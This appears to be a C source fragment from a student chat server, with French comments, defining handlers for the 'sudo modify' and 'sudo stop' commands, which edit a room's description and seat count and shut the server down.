// Appelé quand le client envoie la commande "sudo modify <place> <description>"
// pre: isConnected(dSC) == 1
// post: !(0 < place < MAX_CLIENT) || atoi(place) == 0 => pas de modification 
// post: Attention, si le client n'est pas connecté, une erreur est throw
void sendModify(char* place, char* description, int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }

    // On vérifie le format de <place>
    int placeInt;
    if((placeInt = atoi(place)) == 0){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m Place invalide";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        return;
    }

    // On vérifie que la place est valide
    if(!(0 < placeInt && placeInt < MAX_CLIENT)){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m Place invalide";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        return;
    }

    // On vérifie que la description est valide
    if(strlen(description) > MAX_DESCRIPTION){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m Description trop longue";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        return;
    }

    // On vérifie que ce n'est pas le salon principal
    int idClient = getID(dSC);
    pthread_mutex_lock(&mutex);
    int roomId = clientList[idClient].roomId;
    pthread_mutex_unlock(&mutex);
    if(roomId == 0){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m Vous ne pouvez pas modifier le salon principal";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        return;
    }

    // On modifie la description et le nombre de place du salon
    pthread_mutex_lock(&mutexRoom);
    strcpy(roomList[roomId].description, description);
    roomList[roomId].nbClient = placeInt;
    pthread_mutex_unlock(&mutexRoom);

    // On envoie un message de confirmation au client
    char join[MAX_CHAR] = "\033[42m[SUCCESS]\033[0m Modification effectuée";
    if(send(dSC, join, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }
}

// Appelé quand le client envoie la commande "sudo stop"
// pre: isConnected(dSC) == 1
// pre: isSuperAdmin(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
void sendStop(int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }

    // On envoie un message de confirmation au client
    char join[MAX_CHAR] = "\033[42m[SUCCESS]\033[0m Arrêt du serveur dans quelques secondes";
    if(send(dSC, join, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }
    
    // On prévient tous les clients que le serveur va s'arrêter
    for(int i = 0; i < MAX_CLIENT; i++){
        if(isConnected(clientList[i].connection.dSC) == 1){
            char join[MAX_CHAR] = "\033[36m[INFO]\033[0m Le serveur va s'arrêter dans quelques secondes";
            if(send(clientList[i].connection.dSC, join, MAX_CHAR, 0) == -1){
                perror("Erreur lors de l'envoie du message");
                exit(0);
            }
        }
    }

    // On arrête le serveur
    sleep(2);
    // Simule un CTRL+C
    raise(SIGINT);
}